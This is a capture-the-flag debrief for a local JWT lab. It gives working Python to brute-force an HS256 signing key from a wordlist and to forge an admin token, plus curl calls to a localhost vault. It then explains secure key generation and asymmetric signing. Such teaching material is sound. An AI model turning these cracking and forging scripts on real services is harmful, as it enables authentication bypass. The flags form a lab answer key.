# DEBRIEF: The Forged Token

## Solutions

### Flag 1: Decode the Claims
```bash
TOKEN=$(curl -s http://localhost:7333/login?user=agent_n | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```
**FLAG{jwt_claims_are_never_secret_only_signed}**

### Flag 2 & 3: Brute-Force + Forge

#### Step 1: Find the key
```python
#!/usr/bin/env python3
import hmac, hashlib, base64

def base64url_decode(data):
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

# Your token from /login
token = "YOUR_TOKEN_HERE"
parts = token.split('.')
sig_input = f"{parts[0]}.{parts[1]}".encode()
actual_sig = base64url_decode(parts[2])

# Try each word in the wordlist
with open("../level07_cracking_the_vault/wordlist.txt") as f:
    for word in f:
        word = word.strip()
        test_sig = hmac.new(word.encode(), sig_input, hashlib.sha256).digest()
        if hmac.compare_digest(test_sig, actual_sig):
            print(f"KEY FOUND: {word}")
            break
```
**Key is:** `dragon`

#### Step 2: Forge admin token
```python
#!/usr/bin/env python3
import hmac, hashlib, base64, json

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

key = "dragon"
header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}))
payload = b64url(json.dumps({"user": "admin", "role": "admin", "clearance": "level-5"}))
sig = b64url(hmac.new(key.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest())
token = f"{header}.{payload}.{sig}"
print(token)
```

#### Step 3: Access the vault
```bash
FORGED="<token from step 2>"
curl -H "Authorization: Bearer $FORGED" http://localhost:7333/vault
```

**FLAG{weak_keys_fall_to_brute_force_in_seconds}**
**FLAG{forge_master_the_keys_to_the_kingdom_are_yours}**

## Mental Model

```
JWT KEY SECURITY:

ATTACK TIMELINE (26-word dictionary, HS256):
  Brute-force time: < 1 millisecond
  Why: HMAC is fast, small keyspace = instant crack

REAL-WORLD KEY SIZES:
  "dragon" (6 chars)    → cracked in microseconds
  "MyC0mp4ny2024" (13)  → cracked in hours (rule-based attack)
  Random 32-byte hex    → heat death of the universe

GENERATING SECURE JWT KEYS:
  openssl rand -hex 32        # 256-bit random key
  python3 -c "import secrets; print(secrets.token_hex(32))"
  head -c 32 /dev/urandom | xxd -p  # alternative

HMAC (Hash-based Message Authentication Code):
  Purpose: prove a message wasn't tampered with
  Inputs: message + secret key → fixed-size output
  Property: without the key, you can't produce a valid signature
  Weakness: if key is guessable, attacker can sign anything

KEY MANAGEMENT HIERARCHY:
├── TERRIBLE: key in source code ("secret", "password")
├── BAD: key from environment variable without rotation
├── OK: key from secrets manager, rotated periodically
├── GOOD: asymmetric keys (RS256) — private key never leaves server
└── BEST: Hardware Security Module (HSM) — key never in software at all

ASYMMETRIC vs SYMMETRIC JWT:
  HS256 (symmetric): same key signs AND verifies
    → anyone who can verify can also forge!
    → bad for microservices (all services need the secret)
  
  RS256 (asymmetric): private key signs, public key verifies
    → verifiers can't forge (they only have public key)
    → good for distributed systems
```

## The Lesson

**If your JWT secret is a dictionary word, your auth is theater.**

A brute-forcer tries thousands of keys per second. If the key is in a
wordlist (or derivable from one), the token can be forged in seconds.

Real JWT secrets should be 256+ bits of random data — generated once,
stored in a secrets manager, rotated periodically.

## Skills Unlocked
- JWT signature verification internals
- HMAC-SHA256 implementation from scratch
- Dictionary-based key brute-forcing
- Token forging with a known key
- Key generation best practices (`openssl rand`)
- Symmetric vs asymmetric signing tradeoffs
